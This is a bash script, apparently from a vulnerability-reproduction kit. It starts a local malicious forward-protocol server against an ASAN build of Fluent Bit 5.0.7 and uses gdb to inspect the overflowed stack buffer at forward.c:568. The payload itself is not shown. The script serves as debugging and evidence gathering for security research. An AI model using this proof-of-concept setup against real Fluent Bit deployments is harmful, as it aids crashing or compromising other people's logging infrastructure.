#!/usr/bin/env bash
# Inspect the live overflow frame in a real Fluent Bit 5.0.7 process.
# Loopback only. Usage: gdb_live.sh <port>
set -u
PORT=$1
HERE=$(cd "$(dirname "$0")" && pwd)
OUT="$HERE/evidence"
mkdir -p "$OUT"
CONF="$OUT/gdb-live.conf"
sed "s/@PORT@/$PORT/" "$HERE/victim.conf.in" > "$CONF"

python3 "$HERE/malicious_forward.py" --port "$PORT" > "$OUT/gdb-server.log" 2>&1 &
SPID=$!
sleep 0.7

ASAN_OPTIONS="detect_leaks=0:replace_intrin=0:abort_on_error=0:handle_segv=0:handle_abort=0:log_path=$OUT/gdb-asan" \
  gdb -q -batch "${FB_BIN:-./bin-v507-asan}" \
    -ex 'set pagination off' \
    -ex 'break forward.c:568' \
    -ex "run -c $CONF" \
    -ex 'printf "=== HIT BREAKPOINT forward.c:568 ===\n"' \
    -ex 'bt 5' \
    -ex 'p &msg' \
    -ex 'x/8bx msg+0' \
    -ex 'x/8bx msg+17' \
    -ex 'x/8bx msg+40' \
    -ex 'x/8bx msg+48' \
    -ex 'x/8bx msg+56' \
    -ex 'x/8bx msg+63' \
    -ex 'info registers rbp rsp rip' \
    -ex 'printf "=== END ===\n"' \
    > "$OUT/gdb-live.out" 2>&1
GRC=$?

kill -TERM "$SPID" 2>/dev/null || true
wait "$SPID" 2>/dev/null || true
echo "GDB_RC=$GRC"
cat "$OUT/gdb-live.out"
echo "--- SERVER ---"
cat "$OUT/gdb-server.log"
